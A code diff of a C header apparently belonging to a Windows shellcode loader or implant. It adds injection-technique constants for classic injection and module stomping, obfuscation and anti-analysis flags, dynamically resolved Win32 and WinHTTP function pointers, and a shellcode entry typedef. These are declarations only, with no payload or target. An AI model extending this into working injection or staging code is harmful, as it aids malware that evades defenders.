@@ -1,6 +1,7 @@
 #pragma once
 
 #include <windows.h>
+#include <winhttp.h>
 
 #include <macros.h>
 #include <native.h>
@@ -13,6 +14,10 @@
 #define CONFIG_USER_AGENT
 #define CONFIG_ADD_HEADERS
 #endif
+
+#define INJECTION_CLASSIC   0x100
+#define INJECTION_STOMPER   0x200
+#define INJECTION_TECHNIQUE 0x00
 
 #define OBFUSCATION
 #define ANTI_ANALYSIS 
@@ -113,6 +118,7 @@ BOOL InitInstance(
 typedef struct _INSTANCE {
     PTEB Teb;
     struct {
+        
         HMODULE  (WINAPI *LoadLibraryExA)(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
         WINBOOL  (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
         LPVOID   (WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -125,8 +131,32 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
         NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
         NTSTATUS (NTAPI *SystemFunction040)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
-        VOID     (__stdcall *BlackoutMain)( PVOID );
+        HANDLE   (NTAPI *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+
+        HLOCAL  (WINAPI *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
+        HLOCAL  (WINAPI *LocalFree)(HLOCAL hMem);
+        HLOCAL  (WINAPI *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
+
+        HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
+        HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
+        HINTERNET (*WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
+        BOOL      (*WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
+        BOOL      (*WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
+        BOOL      (*WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
+        BOOL      (*WinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
+        BOOL      (*WinHttpCloseHandle)(HINTERNET hInternet);
+
+        VOID     (*BlackoutMain)( PVOID );
     } Win32;
+
+    DWORD InjectionTechnique;
 } INSTANCE, *PINSTANCE;
 
 extern INSTANCE Instance;
+
+typedef struct _STOMP_ARGS {
+    PVOID  Backup;
+    UINT64 Length;
+} STOMP_AGRS, *PSTOMP_ARGS;
+
+typedef (*ShellcodeMain)();
